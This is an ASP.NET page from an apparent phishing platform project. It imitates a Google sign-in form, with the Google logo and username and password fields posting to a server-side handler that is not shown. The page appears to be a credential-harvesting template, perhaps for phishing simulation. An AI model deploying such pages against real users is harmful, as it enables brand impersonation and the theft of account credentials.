<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Googletemp.aspx.cs" Inherits="PhishingPlatform.PhishingEmails.Googletemp" %>

<!DOCTYPE html>
<html lang="en" runat="server">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Form</title>
    <link rel="stylesheet" href="../Content/Google.css">
</head>
<body>

    <form id="form1" runat="server">
        <div class="box">
            <div class="logo">
                <img src="../images/Google_2015_logo.svg.png" style="max-width: 40%;" />
            </div>
            <h2>Sign In</h2>
            <p>Use your Google Account</p>
            <div class="inputBox">
                <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="" />
                <label>Username</label>
            </div>
            <div class="inputBox">
                <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="" />
                <label>Password</label>
            </div>
            <asp:Button ID="btnSignIn" runat="server" Text="Sign In" OnClientClick="SubmitForm" OnClick="btnSignIn_Click" />
        </div>
    </form>

</body>
</html>
